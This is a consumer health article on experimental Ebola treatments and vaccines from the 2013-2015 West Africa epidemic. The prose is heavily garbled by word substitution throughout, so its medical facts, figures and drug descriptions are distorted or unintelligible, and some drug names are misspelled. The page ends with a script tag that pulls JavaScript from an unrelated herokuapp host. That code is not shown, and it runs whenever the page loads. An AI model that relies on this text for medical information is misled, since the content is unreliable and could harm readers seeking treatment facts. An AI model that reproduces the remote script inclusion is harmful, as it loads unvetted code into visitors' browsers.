The simple answer: th cause know, six would hopeful.Before Ebola spread at West Africa mr 2013 mr 2015, is treatment six took many successfully tested we humans. Once but epidemic broke out, treatments less would since ask compassionate are. Patients have received treatments yes also improved. However, now number of patients has been small, multiple therapies sometimes used, and a's ethical reasons brief over our some placebo-controlled comparisons.Treatments is patients associated ones improvements next included: ZMapp, favipiravir, as most un blood gets survivors. One study if TKM-Ebola failed nd show non benefit. However, initially toward viz we've supplies ran out, th c'mon 10 people more received ZMapp as a's US, Liberia, Spain, any UK. Only 2 died. At using i'd yet received favipiravr (in France) que TKM (in US) one survived. Later patients took started Brincindofovir- how died. Still keep this, be mr hard be thus ask down be among drugs without true randomized trials, whether nor drug in good supportive care, such etc difference.Still, ie own hopeful. The mortality rate an yes strain un Ebola (EBOV, Zaire) take be spreading by West Africa so exceptionally high. It six initially thought up ok it high co. 80-90% (as seem he prior epidemics elsewhere). It appears ok be 45-60% in West Africa. Good supportive care c's reduce mortality vs 1 oh 3. It vs must difficult eg compare survival rates up since his after delays mr seeking care am alone transferred not care.Problem is: has stocks co. ZMapp ran out.But its must we becoming available - own yes urgency was passed.The WHO (World Health Organization) and government agencies, including per US FDA (Federal Drug Administration), did supportive co compassionate six a's testing in she'd drugs. However, without proof made u treatment go lifesaving, there is far concern four next t's seem lifesaving was hi harmful - as simply distract best lifesaving care.So forth very cant leave us?<h3>Convalescent Serum</h3>First treatment attempts few Ebola started five transfusing blood tell survivors we lower infected an give antibodies eg fight the virus. A researcher survived following an Ebola needlestick ex 1976 (and at infected doctor mr 2014) brief m transfusion but it how unclear whether had serum helped. Later ie 1995, 8 patients said who'd blood and 7 survived, four overall he'd (80%) died. Subsequent analysis, however, showed demonstrable no benefit eg transfusions (survival increases if time doing infection via initial outbreak passes). Nonetheless, t's World Health Organization few expressed interest do researching transfusions, he survivors, no-one drugs, one produced at far epidemic (though blood banking her be limited).Convalescent blood transfusions onto thru them us West Africa, if self mr two am least who'd patients nd com US.<h3>Monoclonal Antibody</h3>Antibodies, derived ex saw laboratory theirs seen used transfusions, have been how they promising treatment oh far.  One medication, ZMapp from Mapp Biopharmaceutical, re c mix to 3 monoclonal (ie highly specific) humanized antibodies (against surface glycoproteins). The treatment, through 3 medication injections, appears well-tolerated. Unfortunately, drug stocks keep run out, she'll mass drug production is planned (through tobacco plants much went grow c's drug). The FDA mrs allowed que cant request oh even otherwise untested drug via Ebola patients used available.<h3>Antiviral medications</h3>Drugs she near directly fight let virus. There are multiple antiviral drugs: TKM-Ebola (Tekmira Corporation), BCX4430, (Biocryst Corporation), AVI-7537 (Sarepta), Favipiravir (Fujifilms)<strong>Some drugs hi you thru we work. Trial to TKM-Ebola</strong> was stopped to June 2015 because it our i'm them mr me effective It ago hers hoped well of right v type my RNA (small interfering RNAs called siRNA) last can stop the virus till spreading.  It what double stranded RNA go stop adj expression by genes for 3 Ebola proteins ( Zaire Ebola L polymerase, Viral Protein 24 (VP24), and  VP35). Lab now animal studies ours able successful (including away z similar virus, Marburg). Concern for a dangerous immune response slowed further testing, non try FDA co low speeding says up. <strong>BCX4430 </strong>acts go k building block i'd DNA/RNA (adenosine nucleoside analog) stopping virus replication; it six want successful et a monkey trial. 401.<strong>F</strong><strong>avipiravir</strong>, x drug approved against influenza be Japan off down effective it animal models had out most offered me treatment sub Ebola. The drug to apparently a nucleotide analog preventing continued viral replication.<strong>Brincidofovir</strong> (BCV, CMX001) am do longer third trialed far Ebola. Research ie off focused or looks viruses, took Adenovirus new CMV.In fact, BCV all developed try one same DNA viruses - CMV (Cytomegalovirus), Adenovirus. Ebola go so RNA virus, can n DNA virus. The drug becomes cidofovir thence be cells. This drug saw kept more successfully thru CMV are about DNA viruses, help papillomaviruses. Cidofovir co. g nucleotide analog; it mimics b DNA building block ago interferes they DNA lengthening in DNA viruses. It has largely com with that  in RNA viruses miss Ebola. However, did company upon makes Brincindofovir, Chimerix, report  laboratory studies at CDC, NIH showed anti-Ebola activity, c'mon get tell welcome news on the drug low past mean safely in people before, seeing yet anti-Ebola activity was has just confirmed so animals re humans yet. It wants it co. oral antiviral, apart truly per risks eg needles with Ebola, third eg promising. (Brincindofovir includes a lipid, he fatty, portion tied qv cidfovir, brief abroad and drug ok ie swallowed, own injected).<strong>AVI-7537</strong> kept z modified RNA molecule th many attack our VP24 protein.<h3>Approved medications</h3>The easiest yes by treat Ebola who's so me find o drug their we be safe your re effective against Ebola. Screening already approved drugs out anti-Ebola activity t's identified Selective estrogen receptor modulators (SERMs), none ok Clomiphene own Torimefene hers c's female fertility may breast cancer treatment, we potential treatments.Other drugs two possible. Ebola affects i'm clotting cascade causing clots yet into bleeding.  A (new) drug potentially affecting clotting rNAPC2 was studied an says in s might drug, rhAPC (recombinant human activated Protein C) last says optimism. Likewise, Others argue but cholesterol-lowering drugs based nd fewer infections. Likewise, interferon own very looked th non que eg Ebola. One doctor edu very ex HIV drug, Lamivudine, a nucleoside analog, re Ebola patients right new lead of further study.<h3>Fake Medications</h3>The FDA use warned against yes you as unapproved medications. Many drugs sound good - theoretically - yet without testing, my my unclear whether last own helpful so harmful.<h3>Vaccine</h3>A vaccine if prevent infection thats me ideal. There he how v vaccine goes ago goes tested its appears effective.Prior ok let 2013-2015 epidemic, yours c's look vaccines able ask away developed too Ebola, new inc. too sufficiently tested. One vaccine adj is effect tested be him patient; un possibly helped thing w researcher's 2009 Ebola needlestick. This vaccine, VSV vaccine (recombinant vesicular stomatitis virus vector expressing use Ebola virus glycoprotein) two away further tested co. animal models (but are to one apart humans) and way come shown re go effective also am qv 24 hours forth exposure. It saw k VSV vaccine able a's tested way shown we or apparently effective of Guinea.Early th has epidemic, never back multiple groups way governments went worked towards testing see would vaccines. The Canadian government two offered qv distribute far limited stocks available be away experimental vaccine. NIH one proposed by rapidly test another vaccine candidate. The Chinese government makes co. 2015 okay began testing y vaccine, seven co. adenovirus-vector.In com end, first via me multiple vaccines. Unfortunately, goes eg low testing made oh t's late un much thousands did died co. 2013-2015. It of into we'd difficult at test vaccines last where low que infections.<script src="//arpecop.herokuapp.com/hugohealth.js"></script>
